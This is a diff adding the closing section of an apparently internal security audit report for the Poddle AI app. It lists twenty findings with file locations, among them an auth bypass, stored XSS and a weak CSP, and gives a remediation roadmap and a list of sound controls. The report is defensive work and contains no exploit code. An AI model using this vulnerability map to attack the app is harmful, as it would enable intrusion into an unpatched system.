+          requirements (GDPR right to erasure logging, SOC 2 access controls) cannot be met.
+        </p>
+        <div class="finding-fix">
+          <dt>Recommended Fix</dt>
+          <dd>Create a single <code>admin_audit_log</code> table. Add an INSERT at the beginning
+          of every SECURITY DEFINER function that performs privileged operations. Expose this
+          log in the admin dashboard.</dd>
+        </div>
+      </div>
+    </div>
+
+    <!-- ───────────── Summary Table ───────────── -->
+    <div class="section-header">
+      <div class="icon" style="background:#f8fafc;">📋</div>
+      <h2>Full Findings Summary</h2>
+    </div>
+
+    <table class="summary-table">
+      <thead>
+        <tr>
+          <th>#</th>
+          <th>Finding</th>
+          <th>Severity</th>
+          <th>File / Location</th>
+          <th>CVSS (est.)</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr><td>C1</td><td>Auth bypass via from_queue flag</td><td><span class="tag severity-critical">Critical</span></td><td><code>workspace-synthesize/index.ts:27</code></td><td>9.8</td></tr>
+        <tr><td>C2</td><td>Stored XSS via dangerouslySetInnerHTML</td><td><span class="tag severity-critical">Critical</span></td><td><code>BlogPost.tsx:226</code></td><td>9.3</td></tr>
+        <tr><td>C3</td><td>CSP allows unsafe-inline / unsafe-eval</td><td><span class="tag severity-critical">Critical</span></td><td><code>public/_headers:32</code></td><td>8.8</td></tr>
+        <tr><td>C4</td><td>Architecture docs publicly accessible</td><td><span class="tag severity-critical">Critical</span></td><td><code>public/*.doc</code></td><td>7.5</td></tr>
+        <tr><td>H1</td><td>No role-based access control on workspace ops</td><td><span class="tag severity-high">High</span></td><td><code>workspace-ai-chat/index.ts:386</code></td><td>7.3</td></tr>
+        <tr><td>H2</td><td>No rate limit on password reset</td><td><span class="tag severity-high">High</span></td><td><code>Auth.tsx:70</code></td><td>7.1</td></tr>
+        <tr><td>H3</td><td>Sensitive tokens in localStorage</td><td><span class="tag severity-high">High</span></td><td><code>App.tsx:108, 246</code></td><td>7.0</td></tr>
+        <tr><td>H4</td><td>delete_user_account has no audit trail or transaction</td><td><span class="tag severity-high">High</span></td><td><code>migration 20260322104814</code></td><td>6.8</td></tr>
+        <tr><td>H5</td><td>get_admin_all_users has no audit logging</td><td><span class="tag severity-high">High</span></td><td><code>migration 20260626165233</code></td><td>6.5</td></tr>
+        <tr><td>H6</td><td>Silent profile creation failures in onAuthStateChange</td><td><span class="tag severity-high">High</span></td><td><code>AuthContext.tsx:61</code></td><td>6.3</td></tr>
+        <tr><td>H7</td><td>Admin idle timeout uses local scope only</td><td><span class="tag severity-high">High</span></td><td><code>AuthContext.tsx:44</code></td><td>6.1</td></tr>
+        <tr><td>M1</td><td>Anonymous forms have no length constraints</td><td><span class="tag severity-medium">Medium</span></td><td><code>migrations 20260408, 20260618</code></td><td>5.3</td></tr>
+        <tr><td>M2</td><td>CORS wildcard on all edge functions</td><td><span class="tag severity-medium">Medium</span></td><td><code>All 24 edge functions</code></td><td>5.1</td></tr>
+        <tr><td>M3</td><td>Referral code enumeration</td><td><span class="tag severity-medium">Medium</span></td><td><code>AuthContext.tsx:149</code></td><td>5.0</td></tr>
+        <tr><td>M4</td><td>View count inflation attack</td><td><span class="tag severity-medium">Medium</span></td><td><code>migration 20260410222916</code></td><td>4.8</td></tr>
+        <tr><td>M5</td><td>PDF export lacks access validation</td><td><span class="tag severity-medium">Medium</span></td><td><code>pdfExport.ts</code></td><td>4.5</td></tr>
+        <tr><td>M6</td><td>AI rate limit too high — cost exposure</td><td><span class="tag severity-medium">Medium</span></td><td><code>ask-agents/index.ts:34</code></td><td>4.3</td></tr>
+        <tr><td>L1</td><td>robots.txt discloses private routes</td><td><span class="tag severity-low">Low</span></td><td><code>public/robots.txt:14</code></td><td>3.2</td></tr>
+        <tr><td>L2</td><td>Verbose error messages</td><td><span class="tag severity-low">Low</span></td><td><code>Multiple edge functions</code></td><td>3.0</td></tr>
+        <tr><td>L3</td><td>No centralised audit logging</td><td><span class="tag severity-low">Low</span></td><td><code>Multiple admin RPCs</code></td><td>2.8</td></tr>
+      </tbody>
+    </table>
+
+    <!-- ───────────── Remediation roadmap ───────────── -->
+    <div class="section-header">
+      <div class="icon" style="background:#f0fdf4;">🗺️</div>
+      <h2>Remediation Roadmap</h2>
+    </div>
+
+    <div class="rec-list">
+      <div class="rec-item">
+        <div class="rec-priority p-immediate">ASAP</div>
+        <div class="rec-content">
+          <h4>Fix from_queue auth bypass (C1)</h4>
+          <p>Replace the client-controlled flag with internal service-key detection. This vulnerability is exploitable today with no special tooling.</p>
+        </div>
+      </div>
+      <div class="rec-item">
+        <div class="rec-priority p-immediate">ASAP</div>
+        <div class="rec-content">
+          <h4>Remove architecture documents from public/ (C4)</h4>
+          <p>Delete poddle-architecture-blueprint-v2.doc and security-audit.docx from the public directory immediately.</p>
+        </div>
+      </div>
+      <div class="rec-item">
+        <div class="rec-priority p-urgent">Urgent</div>
+        <div class="rec-content">
+          <h4>Sanitize blog content before rendering (C2)</h4>
+          <p>Install DOMPurify and wrap all dangerouslySetInnerHTML usages. This is a 30-minute fix that closes a full stored XSS vector.</p>
+        </div>
+      </div>
+      <div class="rec-item">
+        <div class="rec-priority p-urgent">Urgent</div>
+        <div class="rec-content">
+          <h4>Harden Content Security Policy (C3)</h4>
+          <p>Remove unsafe-inline and unsafe-eval from script-src. Add HSTS. Add X-Frame-Options: DENY to the root route.</p>
+        </div>
+      </div>
+      <div class="rec-item">
+        <div class="rec-priority p-high">1 Week</div>
+        <div class="rec-content">
+          <h4>Add role-based access control to workspace operations (H1)</h4>
+          <p>Validate member role in workspace-ai-chat and workspace-synthesize before processing requests.</p>
+        </div>
+      </div>
+      <div class="rec-item">
+        <div class="rec-priority p-high">1 Week</div>
+        <div class="rec-content">
+          <h4>Create admin_audit_log table (H4, H5, L3)</h4>
+          <p>One table, five INSERT calls across admin functions. Closes three findings at once and enables post-incident investigation.</p>
+        </div>
+      </div>
+      <div class="rec-item">
+        <div class="rec-priority p-high">1 Week</div>
+        <div class="rec-content">
+          <h4>Add rate limiting to password reset and ask-agents (H2, M6)</h4>
+          <p>Implement per-IP limits in both edge functions. Add a 60-second client cooldown on the Auth page submit button.</p>
+        </div>
+      </div>
+      <div class="rec-item">
+        <div class="rec-priority p-medium">1 Month</div>
+        <div class="rec-content">
+          <h4>Refactor sensitive token storage away from localStorage (H3, M3)</h4>
+          <p>Pass invite tokens and referral codes via URL state only. Clear all non-essential storage items on logout.</p>
+        </div>
+      </div>
+      <div class="rec-item">
+        <div class="rec-priority p-medium">1 Month</div>
+        <div class="rec-content">
+          <h4>Add length constraints to anonymous-writable tables (M1)</h4>
+          <p>ALTER TABLE to add CHECK constraints on contact_messages and inbox_submissions. Prevents spam and storage exhaustion.</p>
+        </div>
+      </div>
+      <div class="rec-item">
+        <div class="rec-priority p-medium">1 Month</div>
+        <div class="rec-content">
+          <h4>Restrict CORS origins and add IP-based view count limits (M2, M4)</h4>
+          <p>Lock CORS to production domain. Add IP bucketing to increment_* functions to prevent metrics fraud.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Positive findings -->
+    <div class="section-header">
+      <div class="icon" style="background:#f0fdf4;">✅</div>
+      <h2>Well-Implemented Security Controls</h2>
+    </div>
+
+    <div style="background:#f0fdf4;border:1px solid #bbf7d0;border-radius:10px;padding:24px 28px;margin-bottom:48px;">
+      <ul style="list-style:none;display:grid;grid-template-columns:1fr 1fr;gap:10px;">
+        <li style="font-size:13.5px;color:#166534;display:flex;gap:8px;align-items:flex-start;">
+          <span style="color:#16a34a;font-weight:900;flex-shrink:0;">✓</span>
+          RLS enabled on 100% of database tables
+        </li>
+        <li style="font-size:13.5px;color:#166534;display:flex;gap:8px;align-items:flex-start;">
+          <span style="color:#16a34a;font-weight:900;flex-shrink:0;">✓</span>
+          All ownership checks use <code style="background:rgba(0,0,0,0.05)">auth.uid()</code>, never <code style="background:rgba(0,0,0,0.05)">current_user</code>
+        </li>
+        <li style="font-size:13.5px;color:#166534;display:flex;gap:8px;align-items:flex-start;">
+          <span style="color:#16a34a;font-weight:900;flex-shrink:0;">✓</span>
+          All SECURITY DEFINER functions set <code style="background:rgba(0,0,0,0.05)">search_path = public</code>
+        </li>
+        <li style="font-size:13.5px;color:#166534;display:flex;gap:8px;align-items:flex-start;">
+          <span style="color:#16a34a;font-weight:900;flex-shrink:0;">✓</span>
+          Link detection restricts to https:// URLs only — javascript: injection not possible
+        </li>
+        <li style="font-size:13.5px;color:#166534;display:flex;gap:8px;align-items:flex-start;">
+          <span style="color:#16a34a;font-weight:900;flex-shrink:0;">✓</span>
+          Workspace synthesis queue RLS correctly scoped (members read, service role writes)
+        </li>
+        <li style="font-size:13.5px;color:#166534;display:flex;gap:8px;align-items:flex-start;">
+          <span style="color:#16a34a;font-weight:900;flex-shrink:0;">✓</span>
+          Jailbreak pattern detection present in workspace-ai-chat
+        </li>
+        <li style="font-size:13.5px;color:#166534;display:flex;gap:8px;align-items:flex-start;">
+          <span style="color:#16a34a;font-weight:900;flex-shrink:0;">✓</span>
+          Daily AI usage quota enforced server-side per user
+        </li>
+        <li style="font-size:13.5px;color:#166534;display:flex;gap:8px;align-items:flex-start;">
+          <span style="color:#16a34a;font-weight:900;flex-shrink:0;">✓</span>
+          Blog posts gated by <code style="background:rgba(0,0,0,0.05)">is_published = true</code> for public reads
+        </li>
+        <li style="font-size:13.5px;color:#166534;display:flex;gap:8px;align-items:flex-start;">
+          <span style="color:#16a34a;font-weight:900;flex-shrink:0;">✓</span>
+          Password reset rate limiting migration exists (20260413)
+        </li>
+        <li style="font-size:13.5px;color:#166534;display:flex;gap:8px;align-items:flex-start;">
+          <span style="color:#16a34a;font-weight:900;flex-shrink:0;">✓</span>
+          User pattern intelligence uses correct USING + WITH CHECK on all mutations
+        </li>
+        <li style="font-size:13.5px;color:#166534;display:flex;gap:8px;align-items:flex-start;">
+          <span style="color:#16a34a;font-weight:900;flex-shrink:0;">✓</span>
+          Admin role checked server-side via <code style="background:rgba(0,0,0,0.05)">admins</code> table (not client-only)
+        </li>
+        <li style="font-size:13.5px;color:#166534;display:flex;gap:8px;align-items:flex-start;">
+          <span style="color:#16a34a;font-weight:900;flex-shrink:0;">✓</span>
+          X-Content-Type-Options, Referrer-Policy, Permissions-Policy headers present
+        </li>
+      </ul>
+    </div>
+
+  </div><!-- /body -->
+
+  <div class="report-footer">
+    <strong>Poddle AI — Confidential Security Audit Report</strong><br>
+    Generated 29 June 2026 · Internal use only · Do not distribute externally<br>
+    This document contains sensitive vulnerability information. Handle as restricted.
+  </div>
+
+</div><!-- /page -->
+</body>
+</html>
